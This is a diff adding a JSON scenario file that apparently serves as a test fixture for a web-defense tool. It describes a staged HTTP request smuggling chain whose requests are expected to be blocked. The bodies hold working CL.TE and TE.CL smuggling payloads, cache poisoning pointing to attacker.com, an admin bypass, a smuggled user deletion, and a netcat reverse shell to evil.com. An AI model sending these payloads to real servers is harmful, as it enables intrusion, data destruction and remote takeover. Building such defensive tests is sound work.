@@ -1,0 +1,190 @@
+{
+  "id": "http-request-smuggling",
+  "name": "HTTP Request Smuggling Attack Chain",
+  "category": "Protocol Manipulation",
+  "difficulty": "Expert",
+  "description": "Advanced HTTP request smuggling campaign exploiting Content-Length and Transfer-Encoding header discrepancies to bypass security controls and poison responses",
+  "tags": [
+    "request-smuggling",
+    "cl-te",
+    "te-cl",
+    "protocol",
+    "bypass",
+    "cache-poison"
+  ],
+  "steps": [
+    {
+      "id": "smuggle-recon-1",
+      "name": "Proxy Detection and Behavior Analysis",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/",
+        "headers": {
+          "Connection": "keep-alive"
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      }
+    },
+    {
+      "id": "smuggle-probe-1",
+      "name": "Content-Length Header Manipulation Test",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/data",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "44"
+        },
+        "body": "q=search&category=test"
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "dependsOn": [
+        "smuggle-recon-1"
+      ]
+    },
+    {
+      "id": "smuggle-te-cl-1",
+      "name": "TE.CL Request Smuggling Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/submit",
+        "headers": {
+          "Transfer-Encoding": "chunked",
+          "Content-Length": "3"
+        },
+        "body": "8\r\nSMUGGLED\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n"
+      },
+      "execution": {
+        "delayMs": 1800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-probe-1"
+      ]
+    },
+    {
+      "id": "smuggle-cl-te-1",
+      "name": "CL.TE Request Smuggling Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/process",
+        "headers": {
+          "Content-Length": "13",
+          "Transfer-Encoding": "chunked"
+        },
+        "body": "0\r\n\r\nSMUGGLED"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-te-cl-1"
+      ]
+    },
+    {
+      "id": "smuggle-cache-poison-1",
+      "name": "Cache Poisoning via Request Smuggling",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/search",
+        "headers": {
+          "Transfer-Encoding": "chunked",
+          "Content-Length": "44"
+        },
+        "body": "0\r\n\r\nGET /static/evil.js HTTP/1.1\r\nHost: attacker.com\r\nContent-Length: 10\r\n\r\nmalicious=1"
+      },
+      "execution": {
+        "delayMs": 2400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-cl-te-1"
+      ]
+    },
+    {
+      "id": "smuggle-auth-bypass-1",
+      "name": "Authentication Bypass via Smuggling",
+      "stage": "privilege-escalation",
+      "request": {
+        "method": "POST",
+        "url": "/api/user/profile",
+        "headers": {
+          "Content-Length": "85",
+          "Transfer-Encoding": "chunked"
+        },
+        "body": "0\r\n\r\nGET /admin/users HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer admin_token\r\nContent-Length: 10\r\n\r\nbypass=yes"
+      },
+      "execution": {
+        "delayMs": 2800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-cache-poison-1"
+      ]
+    },
+    {
+      "id": "smuggle-waf-bypass-1",
+      "name": "WAF Bypass via Desync Attack",
+      "stage": "defense-evasion",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload",
+        "headers": {
+          "Transfer-Encoding": "chunked",
+          "Content-Length": "0"
+        },
+        "body": "2e\r\nPOST /admin/delete_user HTTP/1.1\r\nContent-Length: 15\r\n\r\nuser_id=victim\r\n0\r\n\r\n"
+      },
+      "execution": {
+        "delayMs": 3200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-auth-bypass-1"
+      ]
+    },
+    {
+      "id": "smuggle-persist-1",
+      "name": "Persistent Backend Poisoning",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/config",
+        "headers": {
+          "Content-Length": "71",
+          "Transfer-Encoding": "chunked"
+        },
+        "body": "0\r\n\r\nPOST /api/backdoor HTTP/1.1\r\nHost: internal.service\r\nContent-Length: 25\r\n\r\ncommand=nc -e /bin/sh evil.com 4444"
+      },
+      "execution": {
+        "delayMs": 3600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "smuggle-waf-bypass-1"
+      ]
+    }
+  ]
+}
